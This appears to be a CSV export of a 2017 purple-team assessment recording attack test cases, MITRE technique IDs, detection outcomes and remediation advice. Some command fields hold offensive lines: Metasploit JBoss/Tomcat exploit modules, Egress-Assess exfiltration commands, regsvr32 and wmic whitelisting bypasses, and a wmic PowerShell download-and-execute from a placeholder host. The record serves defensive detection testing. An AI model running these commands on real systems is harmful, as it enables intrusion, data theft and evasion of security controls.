AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2017 Q1,C2 Channels,Discovery,Egress Buster,T1046,,Network egress checks,Completed,NotDetected,TBD,TBD,Yes,,1) Egress busting scan is detected by IDS/IPS or firewall,,,"Web Gateway,Firewall",,2017-01-13T10:38:42.930Z,1484303922930,2017-01-13T11:22:23.930Z,1484306543930,2017-01-13T11:55:05.930Z,1484308505930,Security Risk Advisors,,"Identify allowed egress services and ports, including all TCP ports and common UDP ports.",,,Low,Low,Internal,Low,,,,Egress Buster
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - Tomcat,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,,,2017-01-18T08:14:35.930Z,1484727275930,2017-01-18T09:11:27.930Z,1484730687930,2017-01-18T10:26:36.930Z,1484735196930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",msf> use auxiliary/scanner/http/tomcat_mgr_login,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 1,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,SIEM,,2017-01-18T01:07:52.930Z,1484701672930,2017-01-18T03:04:13.930Z,1484708653930,2017-01-18T04:36:32.930Z,1484714192930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Discovery,"Internal - Stealth Port Scan with 3 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detected by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2017-01-18T00:22:30.930Z,1484698950930,2017-01-18T00:35:50.930Z,1484699750930,2017-01-18T01:01:53.930Z,1484701313930,Security Risk Advisors,,Run lighter internal port scanning to probe interesting HTTP ports and services.,,,High,Low,Internal,Medium,,,,Nmap
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - JBoss,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,,,2017-01-18T05:56:38.930Z,1484718998930,2017-01-18T07:07:57.930Z,1484723277930,2017-01-18T07:36:56.930Z,1484725016930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.","Scanner:
msf> use auxiliary/scanner/http/jboss_vulnscan

JMX Console Deployer Upload and Execute:
msf> use exploit/multi/http/jboss_maindeployer",,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 2,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,,,,SIEM,,2017-01-18T10:44:33.930Z,1484736273930,2017-01-18T11:39:53.930Z,1484739593930,2017-01-18T13:35:26.930Z,1484746526930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTP C2,T1041,,Exfil data using common network protocols,Completed,Detected,High,TBD,TBD,,,,,"Web Gateway,DLP,Firewall",Microcosm,2017-01-21T21:15:31.930Z,1485033331930,2017-01-21T21:39:26.930Z,1485034766930,2017-01-21T21:48:17.930Z,1485035297930,Security Risk Advisors,,Extract data from the network over HTTP tcp/80 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTPS C2,T1041,,Exfil data using common network protocols,Completed,NotDetected,TBD,TBD,No,,1) HTTPS / SSL/TLS decryption is enabled in proxy or firewall appliances,,,"Web Gateway,Firewall",,2017-01-21T21:57:44.930Z,1485035864930,2017-01-21T23:00:05.930Z,1485039605930,2017-01-22T00:40:49.930Z,1485045649930,Security Risk Advisors,,Extract data from the network over HTTP tcp/443 to external host or IP.,"# HTTPS Server
./Egress-Assess.py --server https

# HTTPS Client
Invoke-EgressAssess -Client HTTPS -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over SSH/SCP/SFTP protocol,T1048,,Exfil data using common network protocols,Completed,NotDetected,TBD,TBD,Yes,,,,,Firewall,,2017-01-21T18:52:41.930Z,1485024761930,2017-01-21T20:31:32.930Z,1485030692930,2017-01-21T21:15:02.930Z,1485033302930,Security Risk Advisors,,Extract data from the network over HTTP tcp/22 to external host or IP.,"# FTP Server
./Egress-Assess.py --server sftp --username <username> --password <password>

# FTP Client
Invoke-EgressAssess -Client SFTP -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing -Username <username> -Password <password>",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over FTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,TBD,,1) Sensitive data sent over common network protocol is detected by proxy or DLP tool,,,"DLP,Firewall",Gunhed,2017-01-21T14:13:30.930Z,1485008010930,2017-01-21T16:09:05.930Z,1485014945930,2017-01-21T17:08:55.930Z,1485018535930,Security Risk Advisors,,Extract data from the network over HTTP tcp/21 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-01-15T23:23:17.930Z,1484522597930,2017-01-15T23:41:57.930Z,1484523717930,2017-01-16T01:20:05.930Z,1484529605930,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-01-15T13:50:54.930Z,1484488254930,2017-01-15T15:21:53.930Z,1484493713930,2017-01-15T15:26:51.930Z,1484494011930,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-01-15T19:42:10.930Z,1484509330930,2017-01-15T21:19:47.930Z,1484515187930,2017-01-15T22:47:54.930Z,1484520474930,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,NotDetected,TBD,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",,2017-01-15T16:59:57.930Z,1484499597930,2017-01-15T17:54:08.930Z,1484502848930,2017-01-15T18:35:49.930Z,1484505349930,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2017-01-14T12:45:20.930Z,1484397920930,2017-01-14T12:47:11.930Z,1484398031930,2017-01-14T14:46:46.930Z,1484405206930,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T15:05:44.930Z,1484406344930,2017-01-14T17:03:05.930Z,1484413385930,2017-01-14T19:00:02.930Z,1484420402930,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T06:00:38.930Z,1484373638930,2017-01-14T07:22:14.930Z,1484378534930,2017-01-14T09:05:43.930Z,1484384743930,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-13T17:11:48.930Z,1484327508930,2017-01-13T18:14:41.930Z,1484331281930,2017-01-13T18:15:39.930Z,1484331339930,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-13T13:29:37.930Z,1484314177930,2017-01-13T14:00:26.930Z,1484316026930,2017-01-13T15:01:51.930Z,1484319711930,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T02:49:47.930Z,1484362187930,2017-01-14T03:35:08.930Z,1484364908930,2017-01-14T04:02:44.930Z,1484366564930,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-13T23:21:04.930Z,1484349664930,2017-01-14T00:06:32.930Z,1484352392930,2017-01-14T01:25:35.930Z,1484357135930,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-13T15:04:17.930Z,1484319857930,2017-01-13T15:51:54.930Z,1484322714930,2017-01-13T16:56:24.930Z,1484326584930,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-13T18:28:10.930Z,1484332090930,2017-01-13T20:07:35.930Z,1484338055930,2017-01-13T21:56:32.930Z,1484344592930,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T10:03:32.930Z,1484388212930,2017-01-14T11:50:21.930Z,1484394621930,2017-01-14T12:15:34.930Z,1484396134930,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T19:36:36.930Z,1484422596930,2017-01-14T20:36:26.930Z,1484426186930,2017-01-14T20:57:41.930Z,1484427461930,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,4 - Macro - WScript EXE,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-12T03:01:25.930Z,1484190085930,2017-01-12T03:41:38.930Z,1484192498930,2017-01-12T04:00:14.930Z,1484193614930,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Manual Techniques
